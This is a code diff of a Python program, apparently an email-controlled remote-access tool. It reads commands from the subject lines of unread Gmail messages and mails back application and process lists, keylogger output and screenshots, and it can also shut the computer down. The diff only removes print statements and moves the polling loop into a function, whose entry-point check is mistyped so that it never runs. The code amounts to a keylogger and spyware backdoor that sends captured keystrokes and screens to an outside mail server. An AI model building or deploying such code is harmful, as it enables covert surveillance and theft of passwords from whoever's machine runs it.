@@ -13,6 +13,7 @@ import screenshot
 import shutdown
 from process_app import *
 from keylogger import key_logger
+
 import UI
 
 smtp_server = 'smtp.gmail.com'  # SMTP server for Gmail
@@ -55,53 +56,51 @@ def send_email(subject, body, image_data=None):
 
 def CheckAndDo(cmd):
     if  'applications' in cmd:
-        print("Applications")
         send_email("List of applications:", execute_msg(cmd))
     elif 'processes' in cmd:
-        print("Processes")
         send_email( "List of processes:", execute_msg(cmd))
     elif 'keylogger' in cmd:
-        print("Keylogger")
         parts = cmd.split(' ')
         duration = int(parts[1]) if len(parts) > 1 else 10
         send_email("Keys pressed:", key_logger(duration))
     elif 'screenshot' in  cmd:
-        print("Screenshot")
         image_data = screenshot.screen_shot()
         send_email("Screenshot Taken!", "See attachment: ", image_data)
     elif 'shutdown' in cmd:
-        print("Shutdown")
         send_email("Shutting Down PC!", "PC is shutting down...")
         shutdown.shutdown()
 
 
-cmd = 'start'
-emails = UI.load_emails_from_json(emailJson)
-while cmd != 'quit':
-    imap.select("Inbox")
-    # Find all unseen mails in Inbox to read
-    res, mailIds = imap.search(None, '(UNSEEN)')
+def MailChecker():
+    cmd = 'start'
+    emails = UI.load_emails_from_json(emailJson)
+    while cmd != 'quit':
+        imap.select("Inbox")
+        # Find all unseen mails in Inbox to read
+        res, mailIds = imap.search(None, '(UNSEEN)')
 
-    # Read every unseen mail
-    for id in mailIds[0].decode().split():
-        res, mailData = imap.fetch(id, '(RFC822)')
-        message = email.message_from_string(mailData[0][1].decode())
+        # Read every unseen mail
+        for id in mailIds[0].decode().split():
+            res, mailData = imap.fetch(id, '(RFC822)')
+            message = email.message_from_string(mailData[0][1].decode())
 
-        # Get message from Subject part of the mail
-        cmd = message.get("Subject")
-        username_receiver = message.get("From")
-        CheckAndDo(cmd.lower())
-        
-        new_email = UI.Email(sender=username_receiver, subject=cmd, snippet="", read=False)
-        emails.append(new_email)  
+            # Get message from Subject part of the mail
+            cmd = message.get("Subject")
+            username_receiver = message.get("From")
+            CheckAndDo(cmd.lower())
+            
+            new_email = UI.Email(sender=username_receiver, subject=cmd, snippet="", read=False)
+            emails.append(new_email)  
 
-    UI.save_emails_to_json(emails, emailJson)
+        UI.save_emails_to_json(emails, emailJson)
 
-    imap.close()
+        imap.close()
 
-    time.sleep(0.4)
+        time.sleep(0.4)
 
-print("Bye !!!")
-imap.logout()
+    print("Bye !!!")
+    imap.logout()
 
 # -----------------------------------------------------------------------------------------
+if __name__ == "main":
+    MailChecker()
